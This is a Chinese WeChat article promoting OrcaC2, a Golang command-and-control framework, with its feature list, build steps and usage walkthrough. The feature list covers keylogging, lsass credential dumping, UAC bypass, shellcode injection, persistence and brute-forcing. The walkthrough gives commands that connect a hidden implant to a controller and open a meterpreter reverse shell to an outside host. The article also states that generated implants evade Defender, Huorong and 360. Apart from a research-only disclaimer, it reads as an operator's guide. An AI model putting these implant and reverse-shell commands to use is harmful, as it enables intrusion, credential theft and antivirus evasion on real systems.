<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DasRUr8n2sKhnGNZDGu8ng)

<table><tbody><tr><td width="557" valign="top" height="62"><p><strong>声明：</strong>该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。</p></td></tr></tbody></table>

OrcaC2 是一款基于 Websocket 加密通信的多功能 C&C 框架，使用 Golang 实现；由三部分组成：Orca_Server(服务端)、Orca_Master(控制端)、Orca_Puppet(被控端)。  

**功能特性**

```
Websocket通信，json格式传输数据，消息与数据采用AES-CBC加密+Base64编码
远程命令控制（增加命令备忘录功能，可以快速选择长命令）
文件上传/下载
屏幕截图（被控端为Windows系统）
远程屏幕控制（基于截图流，可控制键盘与鼠标）（被控端为Windows系统）
键盘记录
可查询被控端与被控主机基本信息（查询ip纯真库定位外网ip所对应的地理区域）
进程枚举/进程终止
可交互式终端（被控端为linux系统）
隐藏进程（在使用ps命令时显示进程名为进程列表中任意进程，并能够删除自身程序）（被控端为linux系统）
绕过UAC，获取管理员权限（被控端为Windows系统）
CLR内存加载.Net程序集（被控端为Windows系统）
远程加载Powershell模块（被控端为Windows系统）
远程Shellcode、PE加载（支持的注入方式：CreateThread、CreateRemoteThread、RtlCreateUserThread、EtwpCreateEtwThread）（被控端为Windows系统）
正/反向代理、socks5正/反向代理（支持的协议：tcp、rudp(可靠udp)、ricmp(可靠icmp)、rhttp(可靠http)、kcp、quic）
多协程端口扫描（指纹识别端口信息）
多协程端口爆破（支持ftp、ssh、wmi、wmihash、smb、mssql、oracle、mysql、rdp、postgres、redis、memcached、mongodb、snmp）
远程ssh命令执行/文件上传/文件下载/ssh隧道
远程smb命令执行(无回显)/文件上传（通过rpc服务执行命令，类似wmiexec；通过ipc$上传文件，类似psexec）
使用MiniDumpWriteDump API 提取Lsass.dmp（被控端为Windows系统）
CreateProcessWithPipe方式加载执行mimikatz、fscan（被控端为Windows系统）；memfd方式加载执行fscan（被控端为linux系统）
持久化（计划任务、注册表启动项、服务）（被控端为Windows系统）
反弹meterpreter

```

← 左右滑动查看更多 →  

**编译安装**

**编译源码前需要先在本地安装：go (>=1.18) 、gcc**

### **Windows 系统下编译**

下载并解压源码包后，直接运行 install.bat 文件即可。

### **Linux 系统下编译**

若 install.sh 执行出错需将脚本中的命令一条条单独执行

```
$ git clone https://github.com/Ptkatz/OrcaC2.git
$ cd OrcaC2
$ chmod +x install.sh
$ ./install.sh

```

**工具使用**

**Orca_Server 服务端**  

存在配置文件 (./conf/app.ini) 与数据库文件 (./db/team.db、./qqwry.dat) 的情况下双击即可运行。

**参数说明：**

```
 -c: 指定配置文件路径
 -au: 添加用户
 -du: 删除用户
 -mu: 修改用户的密码

```

**添加一个用户：**  

```
Orca_Server_win_x64.exe -au

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udOL7S7GtYNnAJUACOo8jPzFIrUzr104uicudxCxcwTYlJuBKvruPaklYbEradWQicS0ZXbaRf7jG4Q/640?wx_fmt=png)

### **Orca_Master 控制端**

Server 端数据库中默认的用户名和密码为 admin:123456。

**参数说明：**  

```
 -u | --username: 连接到Server端的用户名
 -p | --password: 连接到Server端的密码
 -H | --host: 连接到Server端的地址，默认为127.0.0.1:6000
 -c | --color: logo与命令提示符的颜色

```

**连接到服务端：  
**

```
Orca_Master_win_x64.exe -H 192.168.1.110:6000 -u 3had0w -p 123456

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udOL7S7GtYNnAJUACOo8jPzO4Wa40ETLwx8Z3T9nP9Zib0X3jtx9LBw4RDxtIZCuBVJ7UpC0IVGUqg/640?wx_fmt=png)

**help：  
**

```
Orca[3had0w] » help
OrcaC2 command line tool
Commands:
  clear            clear the screen
  exit             exit the shell
  generate, build  generate puppet
  help             use 'help [command]' for command help
  list, ls         list hosts
  persist          permission maintenance
  port             use port scan or port brute
  proxy            activate the proxy function
  select           select the host id waiting to be operated
  ssh              connects to target host over the SSH protocol

```

← 左右滑动查看更多 →

**Orca_Puppet 被控端**

Puppet 端可在 Master 端上使用 generate/build 命令生成

**参数说明：  
**

```
-host: 连接到Server端的地址，默认为127.0.0.1:6000
-debug: 打开调试信息，默认为false
-hide: 在Linux系统下可以伪造进程名，并删除自身程序文件

```

**执行被控端上线：**

```
Orca_Puppet_win_x64.exe -host 192.168.1.110:6000 -debug -hide

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udOL7S7GtYNnAJUACOo8jPzV9KiatxQOerozmiaFFerBFMQpIiamtFNlHmAQiciblwRQSq3sa9T5EVWDRQ/640?wx_fmt=png)

或者用 generate/build 命令重新生成木马被控端，执行后会隐藏掉当前命令终端，select id 进入主机会话。

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udOL7S7GtYNnAJUACOo8jPzDiaOP5wFVxZ1ZYGEKKcNHMsyyNo4GDbwFjU8icBPS7ia9Dt7IsjQ3zA3Q/640?wx_fmt=png)

**help：**

```
Orca[3had0w] → 192.168.1.110 » help
OrcaC2 command line tool
Commands:
  assembly         manage the CLR and execute .NET assemblies
  back             back to the main menu
  clear            clear the screen
  close            close the selected remote client
  dump             extract the lsass.dmp
  exec             execute shellcode or pe in memory
  exit             exit the shell
  file             execute file upload or download
  generate, build  generate puppet
  getadmin         bypass uac to get system administrator privileges
  help             use 'help [command]' for command help
  info             get basic information of remote host
  keylogger        get information entered by the remote host through the keyboard
  list, ls         list hosts
  persist          permission maintenance
  plugin           load plugin (mimikatz｜fscan)
  port             use port scan or port brute
  powershell       manage powershell script
  process, ps      manage remote host processes
  proxy            activate the proxy function
  reverse          reverse shell
  screen           screenshot and screensteam
  select           select the host id waiting to be operated
  shell, sh        send command to remote host
  smb              lateral movement through the ipc$ pipe
  ssh              connects to target host over the SSH protocol

```

← 左右滑动查看更多 →

我们还可以通过 reverse 命令来联动 metasploit，支持 tcp、http/https，内存加载执行，可过部分防护。  

```
reverse meterpreter -t tcp -H 192.168.1.120:443

```

![](https://mmbiz.qpic.cn/mmbiz_png/79gZQNibQ6udOL7S7GtYNnAJUACOo8jPzjOib64cqC5MWIRhCz0aAA17g4I5gjy93DnMqyuyicL0icu8kNicU4G3CtQ/640?wx_fmt=png)

就测试到这了吧，还有很多实用功能就不逐一测试，至于如何在实战中运用就看大家自己了，有兴趣的师傅自己去测试研究下，还是挺有意思的...！

**测试小结：**

测试了下火绒、360、WDF，只有 Win10 的 defender 会查杀默认 Puppet 被控端，但用 generate/build 生成的可以过 Win10/2016 的 defender、火绒、360。

BUG 挺多，shell 命令执行报错，WindowsTermina 得到的主机会话不能输入 d、f、b 字符，不知道啥情况，但在 cmd.exe 下不会有这问题。

**下载地址**

**点击下方名片进入公众号**

**回复关键字【****23****0419****】获取******下载链接****

关注公众号回复 “1208” 可以领取个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，“1212” 杀软对比源码 + 数据源，“0421”Windows 提权工具包。

往期推荐工具

[渗透测试常用的数据库综合利用工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484579&idx=1&sn=2f2054508220223100066edf3064b37b&chksm=9036e21ba7416b0d7afecc97d3338d954023a51a5622939782273f264207363e4ea8ba9d18de&scene=21#wechat_redirect)

[RequestTemplate 红队内网渗透工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484512&idx=1&sn=90d24f2727ba99c870d7112c406bf208&chksm=9036e2d8a7416bce7e190896de3c7cbd428d385d5563717bce46b0c7f51f33ea18d3e0f1af1e&scene=21#wechat_redirect)

[Railgun - 一款 GUI 界面的渗透工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484499&idx=1&sn=edeae57e8306db1bfdcb72e0b0b655d2&chksm=9036e2eba7416bfdbe6a495b60a89d1a677fc745aa512036072224fc1537d8931276e55f7c90&scene=21#wechat_redirect)

[GoBypass - Golang 免杀生成工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484019&idx=1&sn=05133dd5cb31474078eb4ab019f164f3&chksm=9036e4cba7416ddd92c8f9147bb2d283ddedcdfb4d46ed5987d192863008be9bc655025e0697&scene=21#wechat_redirect)

[ByPassBehinder 冰蝎 WebShell 免杀工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484096&idx=1&sn=487a1f9daf0090071913aeceeb266d53&chksm=9036e478a7416d6ebced132fe4a03bb1d2584d7fb3eb433612151648743322ff900ae849d572&scene=21#wechat_redirect)

[SweetBabyScan 内网资产探测漏扫工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247484070&idx=1&sn=eb4cd4f6aac6e0a0ef26a75e4bc2bc7a&chksm=9036e41ea7416d088f70e8593099f750c81b079de1b4b14219276b352a2e83a3eb1d5829c94b&scene=21#wechat_redirect)

[掩日 - 适用于红队的综合免杀工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483997&idx=1&sn=1a87fc6bfec2a48dd3dfa5bc2852e8e8&chksm=9036e4e5a7416df3ff7f5b4cf55b4c8c57cde271128de0b9fcdf381a19afb207223deb88fb61&scene=21#wechat_redirect)

[AuxTools 浮鱼渗透辅助工具箱 V1](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483907&idx=1&sn=4e7cf5de0472f6685edb64a598e6aff8&chksm=9036e4bba7416dad5aa253462a84d0c47fdb4e89914c70bd5a3fbbd8b4ef05572a4e7e702faa&scene=21#wechat_redirect).0

[POCbomber 红队快速打点漏洞检测工具](http://mp.weixin.qq.com/s?__biz=MzA4NzU1Mjk4Mw==&mid=2247483790&idx=1&sn=35e3a0fa64cff8d72313fa41ddcbfc3c&chksm=9036e736a7416e20dcd23cfede5c887bfecf5e489234eeb67040bcbbc6326cb42373d226a186&scene=21#wechat_redirect)